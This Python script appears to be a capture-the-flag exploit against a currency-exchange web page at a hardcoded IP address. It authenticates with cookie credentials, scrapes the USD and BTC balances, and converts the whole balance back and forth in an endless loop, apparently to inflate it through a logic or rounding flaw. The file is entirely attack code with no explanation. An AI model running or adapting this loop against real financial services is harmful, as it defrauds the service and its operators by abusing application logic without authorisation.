import requests
import re

cookies = {"name": "papyrus", "password": "papyrus123"}
r = requests.post("http://95.179.148.72:8083/index.php", cookies=cookies)
rr = re.findall(b"Your USD: <b>(\d+.\d+)</b>", r.text.encode("ascii"))
usd = rr[0] if rr else 0.0
rr = re.findall(b"Your BTC: <b>(\d+.\d+)</b>", r.text.encode("ascii"))
btc = rr[0] if rr else 0.0

c_from, c_to = "btc", "usd"
while True:
    data = {
        "from_currency": c_from,
        "to_currency": c_to,
        "amount": btc if c_from == 'btc' else usd
    }
    r = requests.post("http://95.179.148.72:8083/index.php", cookies=cookies, data=data)
    r = requests.post("http://95.179.148.72:8083/index.php", cookies=cookies)
    rr = re.findall(b"Your USD: <b>(\d+.\d+)</b>", r.text.encode("ascii"))
    usd = rr[0] if rr else 0.0
    rr = re.findall(b"Your BTC: <b>(\d+.\d+)</b>", r.text.encode("ascii"))
    btc = rr[0] if rr else 0.0
    print("USD={} / BTC={}".format(usd, btc))
    c_from, c_to = c_to, c_from

